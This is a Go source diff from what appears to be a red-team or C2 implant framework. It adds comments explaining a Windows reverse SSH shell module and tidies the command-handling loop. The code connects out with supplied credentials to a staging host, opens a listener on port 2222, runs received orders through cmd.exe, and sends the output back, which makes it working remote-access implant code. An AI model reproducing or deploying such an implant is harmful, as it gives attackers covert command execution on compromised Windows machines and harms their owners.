@@ -17,7 +17,10 @@ import (
 	"time"
 	"encoding/json"
 )
-
+/*
+This JSON Object definition is needed in some Implants Modules to decode parameters
+Hive will have the same definitions in: ./src/hive/hiveJobs.go
+*/
 type InjectRevSshShellBichito struct {
     Domain string   `json:"domain"`
     Sshkey string   `json:"sshkey"`
@@ -25,7 +28,14 @@ type InjectRevSshShellBichito struct {
     User string   `json:"user"`
 }
 
-
+/*
+Description: Inject Reverse Shell --> Windows
+Flow:
+A.Use golang ssh native library to spawn a ssh client that connects to a target staging
+	A1.Use provided credentials (username and pem key), for the ssh connection
+B.This connection will create a listener in 2222 localport of target staging
+C.Spawn a cmd process within the foothold, and pipe stdout/stdin through this last opened socket
+*/
 func RevSshShell(jsonparams string) (bool,string){
 
 	var revsshshellparams *InjectRevSshShellBichito
@@ -97,7 +107,6 @@ func handleConnection(c net.Conn) {
 		}
 
 		var outbuf,errbuf bytes.Buffer
-		//fmt.Println(order)
 
 		// Start the command
 		cmd := exec.Command("C:\\Windows\\System32\\cmd.exe","/c",order+"\n")
@@ -106,18 +115,12 @@ func handleConnection(c net.Conn) {
 		cmd.Stdout = &outbuf
 		cmd.Stderr = &errbuf
 
-		// Start command
-		//err = cmd.Start()
+
 		err = cmd.Run()
 		if err != nil {
-			//log.Printf("error: could not start command: %s", err)
-			//return
+			return
 		}
 
-		//fmt.Println(outbuf.String())
-
-		//out, _ := cmd.CombinedOutput()
-		//fmt.Println(out)
 		c.Write([]byte(outbuf.String()))
 		c.Write([]byte(errbuf.String()))
 	}
